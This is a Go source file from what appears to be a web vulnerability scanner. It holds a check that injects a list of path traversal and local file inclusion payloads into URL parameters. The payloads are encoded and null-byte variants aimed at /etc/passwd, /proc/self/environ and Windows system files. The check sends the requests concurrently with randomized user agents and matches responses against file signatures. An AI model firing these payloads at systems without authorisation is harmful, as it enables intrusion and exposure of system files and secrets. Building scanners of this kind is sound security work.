package checks

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"

	"whiteclaw/scanner/models"
)

var traversalPayloads = []string{
	"../etc/passwd",
	"../../etc/passwd",
	"../../../etc/passwd",
	"../../../../etc/passwd",
	"../../../../etc/passwd%00",
	"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
	"..%252F..%252F..%252Fetc%252Fpasswd",
	"....//....//....//etc/passwd",
	"/etc/passwd",
	"/proc/self/environ",
	"..\\..\\windows\\win.ini",
	"../../../../Windows/System32/drivers/etc/hosts",
}

var traversalSigs = []string{
	"root:x:", "root:0:", "/bin/bash", "/bin/sh",
	"[fonts]", "HOME=", "PATH=",
	"127.0.0.1   localhost",
}

// PathTraversal tests URL parameters for LFI / path traversal vulnerabilities.
func PathTraversal(client *http.Client, cfg models.ScanConfig) {
	if len(cfg.Params) == 0 {
		models.Status("Path traversal: no URL parameters — skipping.")
		return
	}
	models.Status(fmt.Sprintf(
		"Testing path traversal (%d payloads × %d params)...",
		len(traversalPayloads), len(cfg.Params),
	))

	type job struct{ param, payload string }
	jobs := make([]job, 0, len(cfg.Params)*len(traversalPayloads))
	for _, p := range cfg.Params {
		for _, pl := range traversalPayloads {
			jobs = append(jobs, job{p, pl})
		}
	}

	sem := newSem(cfg.Workers)
	var wg sync.WaitGroup
	reported := map[string]bool{}
	var mu sync.Mutex

	for _, j := range jobs {
		wg.Add(1)
		j := j
		sem.Acquire()
		go func() {
			defer wg.Done()
			defer sem.Release()

			mu.Lock()
			already := reported[j.param]
			mu.Unlock()
			if already {
				return
			}

			injected := injectParam(cfg.URL, j.param, j.payload)
			req, err := http.NewRequest("GET", injected, nil)
			if err != nil {
				return
			}
			req.Header.Set("User-Agent", randomUA())
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
			low := strings.ToLower(string(body))

			for _, sig := range traversalSigs {
				if strings.Contains(low, strings.ToLower(sig)) {
					mu.Lock()
					if !reported[j.param] {
						reported[j.param] = true
						mu.Unlock()
						models.Emit(models.Finding{
							Type:     "finding",
							Severity: "CRITICAL",
							Category: "vulnerabilities",
							Title:    fmt.Sprintf("Path traversal / LFI in parameter %q", j.param),
							Detail:   fmt.Sprintf("Payload: %q\nFile signature: %q\nURL: %s", j.payload, sig, injected),
							Fix:      "Validate paths against an allowlist. Use realpath() to ensure the canonical path stays within the expected directory.",
						})
					} else {
						mu.Unlock()
					}
					return
				}
			}
		}()
	}
	wg.Wait()
}
